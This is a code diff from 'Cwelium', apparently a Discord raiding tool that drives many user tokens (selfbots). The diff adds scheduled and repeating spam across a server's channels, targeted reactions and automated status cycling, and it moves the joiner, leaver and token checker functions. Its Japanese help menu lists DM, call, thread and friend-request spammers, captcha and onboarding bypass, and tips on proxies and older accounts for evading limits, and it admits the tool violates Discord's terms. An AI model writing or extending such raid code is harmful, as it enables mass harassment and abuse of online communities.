@@ -2088,6 +2275,122 @@ class Menu:
             self.run_spammer(self.raider.spammer, args)
 
     @wrapper
+    def schedule_spam(self):
+        console.title("Cwelium - Schedule Spam")
+        guild_id = input(console.prompt("Guild ID"))
+        if not guild_id:
+            self.main_menu()
+        channel_id = input(console.prompt("Channel ID (or leave empty for all channels)"))
+        if channel_id == "":
+            channel_id = None
+        message = input(console.prompt("Message"))
+        if not message:
+            self.main_menu()
+        schedule_time = input(console.prompt("Schedule time (HH:MM)"))
+        if not re.match(r"^\d{2}:\d{2}$", schedule_time):
+            console.log("Invalid time format", C["red"])
+            input("Press Enter...")
+            self.main_menu()
+        valid_tokens = self.raider.get_valid_tokens_for_guild(guild_id)
+        if not valid_tokens:
+            console.log("Failed", C["red"], "No valid tokens in guild")
+            input("Press Enter...")
+            self.main_menu()
+        threading.Thread(target=self.raider.schedule_spam, args=(guild_id, channel_id, message, schedule_time, valid_tokens)).start()
+        console.log("Schedule set", C["green"], False, f"Spam will start at {schedule_time}")
+        input("Press Enter to continue...")
+        self.main_menu()
+
+    @wrapper
+    def repeat_schedule(self):
+        console.title("Cwelium - Repeat Schedule")
+        guild_id = input(console.prompt("Guild ID"))
+        if not guild_id:
+            self.main_menu()
+        channel_id = input(console.prompt("Channel ID (or leave empty for all channels)"))
+        if channel_id == "":
+            channel_id = None
+        message = input(console.prompt("Message"))
+        if not message:
+            self.main_menu()
+        schedule_time = input(console.prompt("Schedule time (HH:MM)"))
+        if not re.match(r"^\d{2}:\d{2}$", schedule_time):
+            console.log("Invalid time format", C["red"])
+            input("Press Enter...")
+            self.main_menu()
+        interval = int(input(console.prompt("Interval between runs (minutes)")) or "60")
+        max_runs = int(input(console.prompt("Max runs (0 for infinite)")) or "0")
+        valid_tokens = self.raider.get_valid_tokens_for_guild(guild_id)
+        if not valid_tokens:
+            console.log("Failed", C["red"], "No valid tokens in guild")
+            input("Press Enter...")
+            self.main_menu()
+        self.raider.repeat_schedule_spam(guild_id, channel_id, message, schedule_time, interval, valid_tokens, max_runs)
+        console.log("Repeat schedule started", C["green"])
+        input("Press Enter to continue...")
+        self.main_menu()
+
+    @wrapper
+    def status_manager(self):
+        console.title("Cwelium - Status Manager")
+        if self.raider.status_thread_running:
+            console.log("Status manager already running", C["yellow"])
+            input("Press Enter...")
+            self.main_menu()
+            return
+        self.raider.status_manager()
+        self.raider.status_thread_running = True
+        console.log("Status manager started", C["green"])
+        input("Press Enter to continue...")
+        self.main_menu()
+
+    @wrapper
+    def advanced_reaction(self):
+        console.title("Cwelium - Advanced Reaction")
+        channel_id = input(console.prompt("Channel ID"))
+        if not channel_id:
+            self.main_menu()
+        target_type = input(console.prompt("Target type (user/keyword/message_id)"))
+        target_value = input(console.prompt("Target value (user_id/keyword/message_id)"))
+        emoji = input(console.prompt("Emoji (name or :emoji:)"))
+        if not all([channel_id, target_type, target_value, emoji]):
+            console.log("Missing parameters", C["red"])
+            input("Press Enter...")
+            self.main_menu()
+        self.raider.advanced_reaction(channel_id, target_type, target_value, emoji)
+        console.log("Advanced reaction triggered", C["green"])
+        input("Press Enter to continue...")
+        self.main_menu()
+
+    @wrapper
+    def joiner(self):
+        console.title("Cwelium - Joiner")
+        invite = input(console.prompt("Invite"))
+        if invite == "":
+            self.main_menu()
+        invite = re.sub(r"(https?://)?(www\.)?(discord\.(gg|com)/(invite/)?|\.gg/)", "", invite)
+        self.raider.joiner(invite)
+
+    @wrapper
+    def leaver(self):
+        console.title("Cwelium - Leaver")
+        guild = input(console.prompt("Guild ID"))
+        if guild == "":
+            self.main_menu()
+        args = [(token, guild) for token in tokens]
+        self.run(self.raider.leaver, args)
+
+    @wrapper
+    def clear_status(self):
+        console.title("Cwelium - Clear Status")
+        self.run(self.raider.clear_activity, [()])
+
+    def onliner(self):
+        console.title("Cwelium - Onliner")
+        args = [(token,) for token in tokens]
+        self.run(self.raider.keep_online, args)
+
+    @wrapper
     def mass_timeout(self):
         console.title("Cwelium - Mass Timeout")
         guild_id = input(console.prompt("Guild ID"))
@@ -2099,7 +2402,8 @@ class Menu:
         valid_tokens = []
         for token in tokens:
             try:
-                resp = global_session.get(f"https://discord.com/api/v9/guilds/{guild_id}/members/@me", headers=self.raider.headers_full(token), timeout=10)
+                resp = self.raider._request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/members/@me",
+                                            token, headers=self.raider.headers_full(token), timeout=10)
                 if resp.status_code == 200:
                     valid_tokens.append(token)
                     console.log("Token", C["green"], False, f"{token[:15]}... 有効")
@@ -2128,7 +2432,8 @@ class Menu:
         valid_tokens = []
         for token in tokens:
             try:
-                resp = global_session.get(f"https://discord.com/api/v9/guilds/{guild_id}/members/@me", headers=self.raider.headers_full(token), timeout=10)
+                resp = self.raider._request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/members/@me",
+                                            token, headers=self.raider.headers_full(token), timeout=10)
                 if resp.status_code == 200:
                     valid_tokens.append(token)
                     console.log("Token", C["green"], False, f"{token[:15]}... 有効")
@@ -2149,58 +2454,6 @@ class Menu:
         console.title("Cwelium - Token Quality")
         self.raider.token_quality_check()
 
-    def show_help(self):
-        console.clear()
-        console.render_ascii()
-        help_text = f"""
-{C['cyan']}【 Cwelium ヘルプ 】{C['white']}
-
-{C['green']}基本操作:{C['white']}
-  番号を入力して Enter で実行します。
-  h または H でヘルプを表示します。
-  ~ でクレジットを表示します。
-
-{C['yellow']}機能一覧:{C['white']}
-  {C['light_blue']}01{C['white']} Joiner          : サーバー参加
-  {C['light_blue']}02{C['white']} Leaver          : サーバー退出
-  {C['light_blue']}03{C['white']} Spammer         : メッセージスパム（永久ループ・投票対応）
-  {C['light_blue']}04{C['white']} Token Checker   : トークン有効性チェック
-  {C['light_blue']}05{C['white']} Emoji Reaction  : リアクション
-  {C['light_blue']}06{C['white']} Clear Status    : ステータス消去
-  {C['light_blue']}07{C['white']} Token Formatter : トークン整形
-  {C['light_blue']}08{C['white']} Button Click    : ボタンクリック
-  {C['light_blue']}09{C['white']} Accept Rules    : ルール承認
-  {C['light_blue']}10{C['white']} Guild Check     : ギルド参加チェック
-  {C['light_blue']}11{C['white']} Friend Spam     : フレンドリクエスト
-  {C['light_blue']}13{C['white']} Onliner         : オンライン維持
-  {C['light_blue']}14{C['white']} Voice Raper     : サウンドボードスパム
-  {C['light_blue']}15{C['white']} Change Nick     : ニック変更
-  {C['light_blue']}16{C['white']} Thread Spammer  : スレッド作成
-  {C['light_blue']}17{C['white']} Typer           : 入力中偽装
-  {C['light_blue']}19{C['white']} Call Spammer    : 通話スパム
-  {C['light_blue']}20{C['white']} Bio Change      : バイオ変更
-  {C['light_blue']}21{C['white']} Voice Joiner    : ボイス参加
-  {C['light_blue']}22{C['white']} Onboard Bypass  : オンボーディング回避
-  {C['light_blue']}23{C['white']} DM Spammer      : DMスパム
-  {C['light_blue']}25{C['white']} Poll Spammer    : 投票スパム
-  {C['light_blue']}26{C['white']} Mass Timeout    : 一斉タイムアウト
-  {C['light_blue']}27{C['white']} Mass Nick All   : 一斉ニック変更
-  {C['light_blue']}32{C['white']} Token Quality   : トークン品質レポート
-
-{C['yellow']}【 コツ 】{C['white']}
-  1. プロキシを使用する（config.json）
-  2. 遅延を調整する（スパマー 3〜5秒）
-  3. @everyone を避ける
-  4. 古いアカウントほど制限が緩い
-
-{C['red']}注意:{C['white']}
-  自己ボット（ユーザートークン）を使用。利用規約に違反します。
-        """
-        print(help_text)
-        input(f"\n   {self.background}~/> press enter to continue ")
-        self.main_menu()
-
-    # ---------- 以下のメソッドはオリジナルからそのまま ----------
     @wrapper
     def dm_spam(self):
         console.title("Cwelium - Dm Spammer")
@@ -2296,28 +2549,6 @@ class Menu:
         self.run(self.raider.thread_spammer, args)
 
     @wrapper
-    def joiner(self):
-        console.title("Cwelium - Joiner")
-        invite = input(console.prompt("Invite"))
-        if invite == "":
-            self.main_menu()
-        invite = re.sub(r"(https?://)?(www\.)?(discord\.(gg|com)/(invite/)?|\.gg/)", "", invite)
-        self.raider.joiner(invite)
-
-    @wrapper
-    def leaver(self):
-        console.title("Cwelium - Leaver")
-        guild = input(console.prompt("Guild ID"))
-        if guild == "":
-            self.main_menu()
-        args = [(token, guild) for token in tokens]
-        self.run(self.raider.leaver, args)
-
-    def checker(self):
-        console.title("Cwelium - Checker")
-        self.raider.token_checker()
-
-    @wrapper
     def reactor(self):
         console.title("Cwelium - Reactor")
         Link = input(console.prompt("Message Link"))
@@ -2329,6 +2560,7 @@ class Menu:
         console.render_ascii()
         self.raider.reactor_main(channel_id, message_id)
 
+    @wrapper
     def button(self):
         console.title("Cwelium - Button Click")
         Link = input(console.prompt("Message Link"))
@@ -2341,10 +2573,6 @@ class Menu:
         console.clear()
         console.render_ascii()
         self.raider.button_bypass(channel_id, message_id, guild_id)
-
-    def formatter(self):
-        console.title("Cwelium - Formatter")
-        self.run(self.raider.format_tokens, [()])
 
     @wrapper
     def accept(self):
@@ -2385,6 +2613,14 @@ class Menu:
         console.render_ascii()
         self.raider.onboard_bypass(guild_id)
 
+    def checker(self):
+        console.title("Cwelium - Checker")
+        self.raider.token_checker()
+
+    def formatter(self):
+        console.title("Cwelium - Formatter")
+        self.run(self.raider.format_tokens, [()])
+
     @wrapper
     def credit(self):
         credits_lines = [
@@ -2398,6 +2634,61 @@ class Menu:
             centered_line = line.center(os.get_terminal_size().columns)
             print(f"{Fore.RESET}{self.background}{centered_line}{Fore.RESET}")
         input("\n ~/> press enter to continue ")
+        self.main_menu()
+
+    def show_help(self):
+        console.clear()
+        console.render_ascii()
+        help_text = f"""
+{C['cyan']}【 Cwelium ヘルプ 】{C['white']}
+
+{C['green']}基本操作:{C['white']}
+  番号を入力して Enter で実行します。
+  h または H でヘルプを表示します。
+  ~ でクレジットを表示します。
+
+{C['yellow']}機能一覧:{C['white']}
+  {C['light_blue']}01{C['white']} Joiner          : サーバー参加（キャプチャ対策強化）
+  {C['light_blue']}02{C['white']} Leaver          : サーバー退出
+  {C['light_blue']}03{C['white']} Spammer         : メッセージスパム（永久ループ・投票対応）
+  {C['light_blue']}04{C['white']} Token Checker   : トークン有効性チェック
+  {C['light_blue']}05{C['white']} Emoji Reaction  : リアクション
+  {C['light_blue']}06{C['white']} Clear Status    : ステータス消去
+  {C['light_blue']}07{C['white']} Token Formatter : トークン整形
+  {C['light_blue']}08{C['white']} Button Click    : ボタンクリック
+  {C['light_blue']}09{C['white']} Accept Rules    : ルール承認
+  {C['light_blue']}10{C['white']} Guild Check     : ギルド参加チェック
+  {C['light_blue']}11{C['white']} Friend Spam     : フレンドリクエスト
+  {C['light_blue']}13{C['white']} Onliner         : オンライン維持
+  {C['light_blue']}14{C['white']} Voice Raper     : サウンドボードスパム
+  {C['light_blue']}15{C['white']} Change Nick     : ニック変更
+  {C['light_blue']}16{C['white']} Thread Spammer  : スレッド作成
+  {C['light_blue']}17{C['white']} Typer           : 入力中偽装
+  {C['light_blue']}19{C['white']} Call Spammer    : 通話スパム
+  {C['light_blue']}20{C['white']} Bio Change      : バイオ変更
+  {C['light_blue']}21{C['white']} Voice Joiner    : ボイス参加
+  {C['light_blue']}22{C['white']} Onboard Bypass  : オンボーディング回避
+  {C['light_blue']}23{C['white']} DM Spammer      : DMスパム
+  {C['light_blue']}25{C['white']} Poll Spammer    : 投票スパム
+  {C['light_blue']}26{C['white']} Mass Timeout    : 一斉タイムアウト
+  {C['light_blue']}27{C['white']} Mass Nick All   : 一斉ニック変更
+  {C['light_blue']}28{C['white']} Schedule Spam   : 予約スパム
+  {C['light_blue']}32{C['white']} Token Quality   : トークン品質レポート
+  {C['light_blue']}33{C['white']} Status Manager  : ステータス自動切替
+  {C['light_blue']}34{C['white']} Adv Reaction    : 高度なリアクション
+  {C['light_blue']}35{C['white']} Repeat Schedule : 繰り返し予約スパム
+
+{C['yellow']}【 コツ 】{C['white']}
+  1. プロキシは必ず設定（data/proxies.txt）
+  2. 遅延は config.json で調整
+  3. @everyone は極力避ける
+  4. 古いアカウントほど制限が緩い
+
+{C['red']}注意:{C['white']}
+  自己ボット（ユーザートークン）を使用。利用規約に違反します。
+        """
+        print(help_text)
+        input(f"\n   {self.background}~/> press enter to continue ")
         self.main_menu()
 
     @wrapper
